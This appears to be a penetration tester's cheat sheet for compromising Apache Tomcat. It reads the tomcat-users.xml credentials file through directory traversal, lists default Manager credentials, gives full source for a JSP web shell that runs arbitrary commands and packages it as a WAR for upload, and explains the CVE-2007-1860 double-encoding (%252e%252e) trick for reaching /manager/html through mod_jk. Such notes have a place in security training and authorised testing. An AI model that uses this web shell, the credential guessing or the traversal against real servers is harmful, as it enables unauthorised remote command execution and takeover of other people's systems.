Password of the Tomcat's administrator in most cases are stored in two places:
- the directory where tomcat is installed
- a directory starting with tomcat in /etc/

 /etc/tomcat6/tomcat-users.xml
 
By default on Debian, this file can only read by root and the member of the group tomcat6, but since the directory 
traversal gives us the same access as the tomcat server, we can read the content of this file. It's possible to retrieve 
tomcat-users.xm

<tomcat-users>
  <role rolename="manager-gui"/>
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="admin" password="s3cret" roles="manager-gui"/>
</tomcat-users>

--------------------------------------------------Default credentials----------------------------------------------------
Our goal here is to gain access to the Tomcat Manager. The Tomcat Manager is used to deploy web applications within Tomcat. 
Tomcat Manager is available at the following URI: /manager/html

tomcat:tomcat
admin:
admin:manager
admin:password
admin:s3cret


--------------------------------------------------Building a Web Shell---------------------------------------------------

To build a Web Shell, we will need to write the Web Shell and package it as a war file. 
To write the Web Shell, we can either use JSP or Servlet. To keep things simple, we are going to build a JSP Web Shell, 
the following code can be used:

<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>


1. $ mkdir webshell
2. $ cp index.jsp webshell

Now we can build the war file using jar (provide with java):
3. $ cd webshell
4. $ jar -cvf ../webshell.war *
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)

Our Web Shell (webshell.war) is now packaged and we can upload it using the Tomcat Manager.

Command: mkdir webshell ; cp webshell.jsp webshell ; cd webshell ; jar -cvf ../webshell.war *

---------------------------------------------------CVE-2007-1860---------------------------------------------

Basically, . is encoded as %2e and the % in %2e is then re-encoded as %25. The value 25 does not need a second encoding.

If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. 
Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. 
If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path 
configured to be forwarded to Tomcat (using `modjk`).

- Apache will send to Tomcat for processing.
- contains the double-encoding trick %252e%252e.
- contains the path /manager/html after the double-encoding to access the Tomcat administration interface.

